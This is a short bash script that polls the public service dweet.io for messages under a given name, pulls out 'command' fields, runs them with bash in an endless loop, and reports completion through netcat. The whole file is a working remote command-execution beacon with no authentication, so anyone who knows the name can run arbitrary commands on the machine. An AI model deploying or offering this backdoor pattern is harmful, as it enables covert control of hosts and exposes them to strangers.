# This file will act as a server running on the remote machine
# It will check for updates on dweet.io for further command execution
# Programs/Utils required - wget, nc, grep, sleep, echo

#!/bin/bash

#===macro section===
DWEET_IO_BASE_READ="http://dweet.io/get/latest/dweet/for/" #the link to get dweet from
#===macro section end===

#config section
WAIT_TIME_SEC=600 #wait time between each consequent updates
DWEET_THING_NAME="$1"


#this is the main loop inside which the 
while true
do
	response=$(wget -qO- $DWEET_IO_BASE_READ$DWEET_THING_NAME) #downloads the page and stores it in response
	echo $response | grep -o command[0-9]*\"\:\"[^\"]*. | grep -o \"[^\"]*.$ | grep -o [a-z].*[^\"] > commands #stores commands in a temp file
	bash commands
	#makes the HTTP request to indicate the task has been done
	echo "GET /dweet/for/$DWEET_THING_NAME?done=yes HTTP/1.1" >> response
	echo "Host: dweet.io" >> response
	echo "Connection: close" >> response
	echo "User-Agent: wget" >> response
	echo "" >> response
	#sends the HTTP request
	nc dweet.io 80 < response
	#deletes temp files
	rm response commands
sleep $WAIT_TIME_SEC #waits for desired time
done

#https://dweet.io/dweet/for/my-thing-name?hello=world
#https://dweet.io/get/latest/dweet/for/my-thing-name
